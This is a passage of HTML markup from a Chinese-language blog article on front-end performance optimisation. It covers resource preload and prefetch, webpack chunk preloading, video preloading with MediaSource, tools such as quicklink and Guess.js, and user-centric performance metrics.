href=&quot;./nextpage.js&quot; as=&quot;script&quot; />`, `71422433634212480000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>preload<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./nextpage.js<span class="token punctuation">"</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>script<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>到这里大家肯定会好奇，Preload 与 Prefetch 有什么区别呢？它们非常容易混淆，在标准里有这么一段话解释两者区别：</p>\n<blockquote>\n<p>The application can use the preload keyword to initiate early, high-priority, and non-render-blocking fetch of a CSS resource that can then be applied by the application at appropriate time.</p>\n</blockquote>\n<p>与 Prefetch 相比，Preload 会强制浏览器立即获取资源，并且该请求具有较高的优先级（mandatory and high-priority），因此建议对一些当前页面会马上用到资源使用 Preload；相对的，Prefetch 的资源获取则是可选与较低优先级的，其是否获取完全取决于浏览器的决定，适用于预获取将来可能会用到的资源。</p>\n<p>如果对 Resource Hints 感兴趣，可以进一步了解<a href="https://juejin.cn/post/6844903645138403341" target="_blank" rel="nofollow noreferrer noopener">它们</a>。</p>\n<h4 id="webpack-中的使用方式"><a href="#webpack-%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>webpack 中的使用方式</h4>\n<p>预加载可以配合 code split 来使用，可以在降低初始加载量的情况下，尽量保证按需加载时的体验。在 webpack 中应用预加载非常简单，只需要在 dynamic import 中添加相应注释，webpack 就会知道你需要对这个 chunk 进行预加载。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="6186125574496071000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`// prefetch\nimport(/* webpackPrefetch: true */ \'./sub1.js\');\n\n// preload\nimport(/* webpackPreload: true */ \'./sub2.js\');`, `6186125574496071000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token comment">// prefetch</span>\n<span class="token keyword">import</span><span class="token punctuation">(</span><span class="token comment">/* webpackPrefetch: true */</span> <span class="token string">\'./sub1.js\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token comment">// preload</span>\n<span class="token keyword">import</span><span class="token punctuation">(</span><span class="token comment">/* webpackPreload: true */</span> <span class="token string">\'./sub2.js\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id="基于-javascript-的预加载"><a href="#%E5%9F%BA%E4%BA%8E-javascript-%E7%9A%84%E9%A2%84%E5%8A%A0%E8%BD%BD" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>基于 JavaScript 的预加载</h3>\n<p>上面提到了基于 Resource Hints 的预加载技术，它其实像是一种声明式技术：你提出你的预加载需求，浏览器根据自身状态，选择合适的时候预加载。</p>\n<p>如果你在不兼容 Resource Hints 的浏览器上进行预加载，或者希望有“更强硬的”预加载控制，你可能会希望使用一些 JavaScript 中的功能来“巧妙”地进行预加载。</p>\n<p>例如对于图片</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="99473985920524940000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`let img = new Image();\nimg.src = \'/static/img/prefetch.jpg\';`, `99473985920524940000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">let</span> img <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nimg<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">\'/static/img/prefetch.jpg\'</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>\n<p>上面的方法会触发浏览器加载图片，然后等到用户需要浏览时，再将其插入到页面即可。</p>\n<p>对于 JavaScript 和 CSS 可以动态添加 <code class="language-text">&lt;script&gt;</code>和 <code class="language-text">&lt;link&gt;</code> 标签，不过要注意它们只有在添加到页面时浏览器才会加载（少数老式浏览器上这块表现会不太一样），由于添加到页面后加载完会执行该资源，所以要避免产生不需要的副作用（否则就不是预加载了）。</p>\n<p>如果你希望通过 JavaScript 来进行预加载，可以使用 PreloadJS 这个库，它提供了包括脚本、样式、图片、字体、SVG 等各类资源的预加载器。</p>\n<h2 id="视频预加载"><a href="#%E8%A7%86%E9%A2%91%E9%A2%84%E5%8A%A0%E8%BD%BD" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>视频预加载</h2>\n<p>视频预加载技术可以有效提高视频播放的用户体验。在 <a href="https://developers.google.com/web/fundamentals/media/fast-playback-with-video-preload" target="_blank" rel="nofollow noreferrer noopener">Fast Playback with Video Preload</a> 中提到了三种视频预加载方式。</p>\n<h3 id="为视频添加-preload-属性"><a href="#%E4%B8%BA%E8%A7%86%E9%A2%91%E6%B7%BB%E5%8A%A0-preload-%E5%B1%9E%E6%80%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>为视频添加 preload 属性</h3>\n<p>使用 preload 属性可以让浏览器预加载相应的内容。其取值与作用如下表所示：</p>\n<table>\n<thead>\n<tr>\n<th align="center">值</th>\n<th align="center">作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align="center">none</td>\n<td align="center">不载入视频（即不预加载）</td>\n</tr>\n<tr>\n<td align="center">meta</td>\n<td align="center">载入元数据（时长、尺寸、文字轨道）</td>\n</tr>\n<tr>\n<td align="center">auto</td>\n<td align="center">加载整个视频</td>\n</tr>\n</tbody>\n</table>\n<p>此外，你还可以设置 poster 属性，它规定视频下载时或用户点击播放按钮前播放器上显示的图像。一种推荐的方式是设置 poster 与 preload: meta，为用户提供一定的播放预览信息的同时避免过多的预加载流量。</p>\n<h3 id="使用-preload-link"><a href="#%E4%BD%BF%E7%94%A8-preload-link" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用 Preload Link</h3>\n<p>这一点已经在第一部分提到了，可以使用</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="34349210502610416000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<link rel=&quot;preload&quot; as=&quot;video&quot; href=&quot;/static/sample.mp4&quot; />`, `34349210502610416000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>preload<span class="token punctuation">"</span></span> <span class="token attr-name">as</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/static/sample.mp4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>进行资源的预加载。</p>\n<h3 id="使用-javascript-进行自定义的-buffer-操作"><a href="#%E4%BD%BF%E7%94%A8-javascript-%E8%BF%9B%E8%A1%8C%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84-buffer-%E6%93%8D%E4%BD%9C" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用 JavaScript 进行自定义的 Buffer 操作</h3>\n<p>可以通过 HTTP Range 请求头来获取开始的一小段视频数据，然后使用 MediaSource API 来进行视频媒体数据的暂存与播放。</p>\n<p>下面这段示例代码摘自 <a href="https://developers.google.com/web/fundamentals/media/fast-playback-with-video-preload#manual_buffering" target="_blank" rel="nofollow noreferrer noopener">Fast Playback with Video Preload - Manual buffering</a>，它可以实现视频数据的预加载，更多相关实现可以参见其中内容。</p>\n<html><head></head><body><div class="gatsby-code-button-container" data-toaster-id="25673245409490030000" data-toaster-class="gatsby-code-button-toaster" data-toaster-text-class="gatsby-code-button-toaster-text" data-toaster-text="复制成功" data-toaster-duration="3500" onclick="copyToClipboard(`<video id=&quot;video&quot; controls></video>\n\n<script>\n  const mediaSource = new MediaSource();\n  video.src = URL.createObjectURL(mediaSource);\n  mediaSource.addEventListener(\'sourceopen\', sourceOpen, { once: true });\n\n  function sourceOpen() {\n    URL.revokeObjectURL(video.src);\n    const sourceBuffer = mediaSource.addSourceBuffer(\'video/webm; codecs=&quot;vp09.00.10.08&quot;\');\n\n    // Fetch beginning of the video by setting the Range HTTP request header.\n    fetch(\'file.webm\', { headers: { range: \'bytes=0-567139\' } })\n      .then((response) => response.arrayBuffer())\n      .then((data) => {\n        sourceBuffer.appendBuffer(data);\n        sourceBuffer.addEventListener(\'updateend\', updateEnd, { once: true });\n      });\n  }\n\n  function updateEnd() {\n    // Video is now ready to play!\n    var bufferedSeconds = video.buffered.end(0) - video.buffered.start(0);\n    console.log(bufferedSeconds + \' seconds of video are ready to play!\');\n\n    // Fetch the next segment of video when user starts playing the video.\n    video.addEventListener(\'playing\', fetchNextSegment, { once: true });\n  }\n\n  function fetchNextSegment() {\n    fetch(\'file.webm\', { headers: { range: \'bytes=567140-1196488\' } })\n      .then((response) => response.arrayBuffer())\n      .then((data) => {\n        const sourceBuffer = mediaSource.sourceBuffers[0];\n        sourceBuffer.appendBuffer(data);\n        // Fetch further segment and append it.\n      });\n  }\n</script>`, `25673245409490030000`)">\n              <div class="gatsby-code-button" title="html">\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div></body></html>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video<span class="token punctuation">"</span></span> <span class="token attr-name">controls</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span>\n\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">\n  <span class="token keyword">const</span> mediaSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MediaSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  video<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>mediaSource<span class="token punctuation">)</span><span class="token punctuation">;</span>\n  mediaSource<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">\'sourceopen\'</span><span class="token punctuation">,</span> sourceOpen<span class="token punctuation">,</span> <span class="token punctuation">{</span> once<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n  <span class="token keyword">function</span> <span class="token function">sourceOpen</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">revokeObjectURL</span><span class="token punctuation">(</span>video<span class="token punctuation">.</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token keyword">const</span> sourceBuffer <span class="token operator">=</span> mediaSource<span class="token punctuation">.</span><span class="token function">addSourceBuffer</span><span class="token punctuation">(</span><span class="token string">\'video/webm; codecs="vp09.00.10.08"\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n    <span class="token comment">// Fetch beginning of the video by setting the Range HTTP request header.</span>\n    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">\'file.webm\'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> headers<span class="token punctuation">:</span> <span class="token punctuation">{</span> range<span class="token punctuation">:</span> <span class="token string">\'bytes=0-567139\'</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>\n      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token operator">=></span> response<span class="token punctuation">.</span><span class="token function">arrayBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>\n      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>\n        sourceBuffer<span class="token punctuation">.</span><span class="token function">appendBuffer</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        sourceBuffer<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">\'updateend\'</span><span class="token punctuation">,</span> updateEnd<span class="token punctuation">,</span> <span class="token punctuation">{</span> once<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n\n  <span class="token keyword">function</span> <span class="token function">updateEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token comment">// Video is now ready to play!</span>\n    <span class="token keyword">var</span> bufferedSeconds <span class="token operator">=</span> video<span class="token punctuation">.</span>buffered<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> video<span class="token punctuation">.</span>buffered<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>bufferedSeconds <span class="token operator">+</span> <span class="token string">\' seconds of video are ready to play!\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n    <span class="token comment">// Fetch the next segment of video when user starts playing the video.</span>\n    video<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">\'playing\'</span><span class="token punctuation">,</span> fetchNextSegment<span class="token punctuation">,</span> <span class="token punctuation">{</span> once<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n\n  <span class="token keyword">function</span> <span class="token function">fetchNextSegment</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">\'file.webm\'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> headers<span class="token punctuation">:</span> <span class="token punctuation">{</span> range<span class="token punctuation">:</span> <span class="token string">\'bytes=567140-1196488\'</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>\n      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token operator">=></span> response<span class="token punctuation">.</span><span class="token function">arrayBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>\n      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>\n        <span class="token keyword">const</span> sourceBuffer <span class="token operator">=</span> mediaSource<span class="token punctuation">.</span>sourceBuffers<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>\n        sourceBuffer<span class="token punctuation">.</span><span class="token function">appendBuffer</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token comment">// Fetch further segment and append it.</span>\n      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id="预加载的策略"><a href="#%E9%A2%84%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AD%96%E7%95%A5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>预加载的策略</h2>\n<p>预加载一般都会面临一些矛盾：</p>\n<ul>\n<li>预加载资源过多，可能导致流量消耗过大，占用正常请求的通道；</li>\n<li>预加载资源过少，可能导致覆盖率太低，对于大部分资源用户无法享受到预加载效果。</li>\n</ul>\n<p>设计一个高效的预加载策略是一个很复杂的问题 ，这里只简单介绍一些工具。</p>\n<h3 id="quicklink"><a href="#quicklink" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>quicklink</h3>\n<p>quicklink 是 GoogleChromeLabs 推出的轻量级库，使用 Resource Hints 进行预加载，对于不支持的浏览器会回退到 XHR 模式。它的策略其实非常直接，核心就是当链接进入到视口后，会对其进行预加载。</p>\n<p>当然我们还可以加一些其他策略，例如设定一个 200ms 的停留阈值。总体而言，它的策略还是比较简单的，更像是为前端预加载提供一个思路。如果感兴趣，可以从<a href="https://juejin.im/post/5c21f8435188256d12597789" target="_blank" rel="nofollow noreferrer noopener">这篇文章</a>中了解 quicklink 的实现细节。</p>\n<h3 id="guessjs"><a href="#guessjs" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Guess.js</h3>\n<p>Guess.js 则是一个更为完备的工具包。它会结合前端访问与打点的数据进行统计，甚至应用一些机器学习的模型，来提供一个更精细化、更准确的预加载策略。同时，在预加载之外，它还可以帮助实现最优的打包方式、加载路径等。核心就是通过大量的实际用户数据，来帮助前端性能优化做决策与预测。</p>\n<p>你可以查看 <a href="https://github.com/guess-js/guess" target="_blank" rel="nofollow noreferrer noopener">Guess.js Repo</a> 来进一步了解它，或者阅读这篇<a href="https://blog.mgechev.com/2018/05/09/introducing-guess-js-data-driven-user-experiences-web/" target="_blank" rel="nofollow noreferrer noopener">介绍文章</a>。</p>\n<h1 id="总结"><a href="#%E6%80%BB%E7%BB%93" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h1>\n<p>从整个前端访问链条的角度，来理解与掌握前端性能优化的知识和技术。</p>\n<h2 id="性能指标"><a href="#%E6%80%A7%E8%83%BD%E6%8C%87%E6%A0%87" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>性能指标</h2>\n<p>Web 发展到现今阶段，性能指标已经不再只是 DOMContentLoad 和 load 这样的“面向浏览器”的指标，更多的会是以用户为中心（user-centric）的指标，例如：</p>\n<ul>\n<li>FP (First Paint)</li>\n<li>FID (First Input Delay)</li>\n<li>FCP (First Contentful Paint)</li>\n<li>FMP (First Meaningful Paint)</li>\n<li>TTI (Time to interactive)</li>\n</ul>\n<p>所以在性能优化之前最重要的还是明确你的监控指标和分析维度，关于性能指标其实也是一个可以继续聊下去的内容，这里就不展开了，以后有机会希望把这部分也补充进来。</p>\n<h2 id="持续优化"><a href="#%E6%8C%81%E7%BB%AD%E4%BC%98%E5%8C%96" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>持续优化</h2>\n<p>性能优化很多时候不是一蹴而就的，更不是一锤子买卖。一个良好的性能优化方案一定是一个持续循环的体系。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" 